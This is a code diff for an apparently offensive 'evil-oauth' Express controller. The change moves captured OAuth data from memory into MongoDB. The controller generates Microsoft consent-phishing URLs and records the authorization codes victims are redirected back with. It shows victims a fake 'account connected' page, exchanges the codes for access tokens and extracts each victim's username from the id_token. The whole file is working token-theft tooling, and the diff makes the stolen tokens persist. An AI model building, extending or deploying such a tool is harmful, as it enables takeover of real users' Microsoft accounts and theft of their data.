@@ -1,4 +1,26 @@
 const https = require('https');
+const mongoose = require('mongoose');
+
+// ---------------------------------------------------------------------------
+// Mongoose model
+// ---------------------------------------------------------------------------
+
+const captureSchema = new mongoose.Schema({
+  captureId:     { type: String, required: true, unique: true, index: true },
+  receivedAt:    { type: String },
+  code:          { type: String, default: null },
+  state:         { type: String, default: null },
+  error:         { type: String, default: null },
+  status:        { type: String, default: 'captured' }, // captured | exchanging | exchanged | failed | error
+  tokenResponse: { type: mongoose.Schema.Types.Mixed, default: null },
+  upn:           { type: String, default: null },
+}, { timestamps: true });
+
+const OAuthCapture = mongoose.models.OAuthCapture || mongoose.model('OAuthCapture', captureSchema);
+
+// ---------------------------------------------------------------------------
+// Helpers
+// ---------------------------------------------------------------------------
 
 function genId() {
   return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
@@ -26,10 +48,10 @@ function httpsPost(hostname, path, formData) {
   });
 }
 
-// In-memory capture store (cleared on server restart)
-const captures = new Map();
-
+// ---------------------------------------------------------------------------
 // POST /api/evil-oauth/generate-url
+// ---------------------------------------------------------------------------
+
 exports.generateUrl = (req, res) => {
   const { clientId, scopes, tenant = 'organizations', redirectUri, prompt = 'consent' } = req.body;
   if (!clientId || !redirectUri) {
@@ -47,12 +69,16 @@ exports.generateUrl = (req, res) => {
   res.json({ url: `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/authorize?${params}` });
 };
 
+// ---------------------------------------------------------------------------
 // GET /api/evil-oauth/callback — public OAuth redirect endpoint
-exports.callback = (req, res) => {
+// ---------------------------------------------------------------------------
+
+exports.callback = async (req, res) => {
   const { code, state, error, error_description } = req.query;
   const id = genId();
-  captures.set(id, {
-    id,
+
+  await OAuthCapture.create({
+    captureId:     id,
     receivedAt:    new Date().toISOString(),
     code:          code || null,
     state:         state || null,
@@ -72,19 +98,26 @@ exports.callback = (req, res) => {
 </div><script>setTimeout(()=>{document.querySelector('h1').textContent="You're all set!";document.querySelector('p').textContent='Your account has been connected. You may close this window.';},2500)</script></body></html>`);
 };
 
+// ---------------------------------------------------------------------------
 // POST /api/evil-oauth/exchange
+// ---------------------------------------------------------------------------
+
 exports.exchange = async (req, res) => {
   const { id, clientId, clientSecret, redirectUri, tenant = 'organizations' } = req.body;
   if (!id || !clientId || !clientSecret || !redirectUri) {
     return res.status(400).json({ error: 'id, clientId, clientSecret, redirectUri required' });
   }
-  const entry = captures.get(id);
+
+  const entry = await OAuthCapture.findOne({ captureId: id });
   if (!entry) return res.status(404).json({ error: 'Capture not found' });
   if (!entry.code) return res.status(400).json({ error: 'No code in this capture' });
-  if (entry.status === 'exchanged') return res.json(entry);
+  if (entry.status === 'exchanged') {
+    return res.json({ id: entry.captureId, ...entry.toObject() });
+  }
 
-  entry.status = 'exchanging';
-  captures.set(id, entry);
+  await OAuthCapture.findOneAndUpdate({ captureId: id }, { status: 'exchanging' });
+
+  let updateFields = {};
 
   try {
     const r = await httpsPost('login.microsoftonline.com', `/${tenant}/oauth2/v2.0/token`, {
@@ -96,41 +129,61 @@ exports.exchange = async (req, res) => {
     });
     const data = JSON.parse(r.body);
     if (data.error) {
-      entry.status = 'failed';
-      entry.error  = `${data.error}: ${data.error_description || ''}`.replace(/:$/, '').trim();
+      updateFields.status = 'failed';
+      updateFields.error  = `${data.error}: ${data.error_description || ''}`.replace(/:$/, '').trim();
     } else {
-      entry.status        = 'exchanged';
-      entry.tokenResponse = data;
-      entry.error         = null;
+      updateFields.status        = 'exchanged';
+      updateFields.tokenResponse = data;
+      updateFields.error         = null;
       if (data.id_token) {
         try {
           const b64     = data.id_token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
           const payload = JSON.parse(Buffer.from(b64, 'base64').toString());
-          entry.upn = payload.upn || payload.preferred_username || payload.email || null;
+          updateFields.upn = payload.upn || payload.preferred_username || payload.email || null;
         } catch {}
       }
     }
   } catch (e) {
-    entry.status = 'failed';
-    entry.error  = e.message;
+    updateFields.status = 'failed';
+    updateFields.error  = e.message;
   }
-  captures.set(id, entry);
-  res.json(entry);
+
+  const updated = await OAuthCapture.findOneAndUpdate(
+    { captureId: id },
+    updateFields,
+    { new: true }
+  );
+
+  const doc = updated.toObject();
+  res.json({ id: doc.captureId, ...doc });
 };
 
+// ---------------------------------------------------------------------------
 // GET /api/evil-oauth/captures
-exports.getCaptures = (req, res) => {
-  res.json([...captures.values()].sort((a, b) => b.receivedAt.localeCompare(a.receivedAt)));
+// ---------------------------------------------------------------------------
+
+exports.getCaptures = async (req, res) => {
+  const docs = await OAuthCapture.find({}).sort({ receivedAt: -1 });
+  res.json(docs.map(doc => {
+    const obj = doc.toObject();
+    return { id: doc.captureId, ...obj };
+  }));
 };
 
+// ---------------------------------------------------------------------------
 // DELETE /api/evil-oauth/captures/:id
-exports.deleteCapture = (req, res) => {
-  captures.delete(req.params.id);
+// ---------------------------------------------------------------------------
+
+exports.deleteCapture = async (req, res) => {
+  await OAuthCapture.deleteOne({ captureId: req.params.id });
   res.json({ ok: true });
 };
 
+// ---------------------------------------------------------------------------
 // DELETE /api/evil-oauth/captures — clear all
-exports.clearCaptures = (req, res) => {
-  captures.clear();
+// ---------------------------------------------------------------------------
+
+exports.clearCaptures = async (req, res) => {
+  await OAuthCapture.deleteMany({});
   res.json({ ok: true });
 };
